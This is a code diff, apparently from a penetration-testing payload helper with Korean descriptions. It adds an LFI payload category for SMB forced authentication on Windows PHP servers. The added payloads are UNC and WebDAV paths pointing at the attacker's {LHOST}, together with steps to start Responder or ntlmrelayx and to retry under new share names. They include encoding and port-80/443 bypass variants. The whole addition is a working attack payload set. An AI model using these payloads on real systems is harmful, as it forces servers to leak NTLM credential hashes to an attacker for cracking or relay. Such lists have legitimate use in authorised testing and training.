@@ -118,6 +118,30 @@ export const lfiPayloadCategories: LfiPayloadCategory[] = [
     ],
   },
   {
+    id: "smb-coercion",
+    title: "SMB 강제 인증 (LFI → NTLM 캡처)",
+    targets: ["windows"],
+    description: "PHP의 include()/fopen()이 Windows에서 UNC 경로(\\\\host\\share)를 받으면 파일시스템 " +
+      "API가 그 경로로 SMB 연결을 직접 시도합니다 — 파일이 없거나 include가 실패해도 인증 시도 자체는 " +
+      "이미 발생합니다. 먼저 Responder(또는 ntlmrelayx)를 tun0에 띄워 리스닝한 뒤 아래 값을 넣으세요. " +
+      "{LHOST}는 감지된 tun0 IP로 자동 치환됩니다 — 감지 안 되면 직접 채워 넣으세요. Responder는 같은 " +
+      "계정의 해시를 재출력하지 않으니, 재시도할 땐 공유 이름을 바꾸세요(test → test2 …).",
+    payloads: [
+      { label: "기본 UNC 경로", payload: "\\\\{LHOST}\\test" },
+      { label: "공유 이름 변형 (재시도용)", payload: "\\\\{LHOST}\\test2" },
+      { label: "URL 인코딩된 백슬래시",
+        payload: "%5C%5C{LHOST}%5Ctest",
+        note: "브라우저 주소창이 원시 백슬래시를 정규화해버릴 때 이 형태로 우회." },
+      { label: "포워드 슬래시 UNC 변형",
+        payload: "//{LHOST}/test",
+        note: "일부 PHP/Windows 조합에서 역슬래시 없이도 UNC로 해석됩니다." },
+      { label: "WebDAV 경유 (445 아웃바운드가 막혀있을 때)",
+        payload: "\\\\{LHOST}@80\\test",
+        note: "SMB(445) 대신 WebClient 서비스가 80으로 붙습니다. Responder의 HTTP 모듈이 캡처합니다." },
+      { label: "WebDAV 경유 (443)", payload: "\\\\{LHOST}@443\\test" },
+    ],
+  },
+  {
     id: "filter-bypass",
     title: "필터·검증 우회",
     targets: ["generic"],
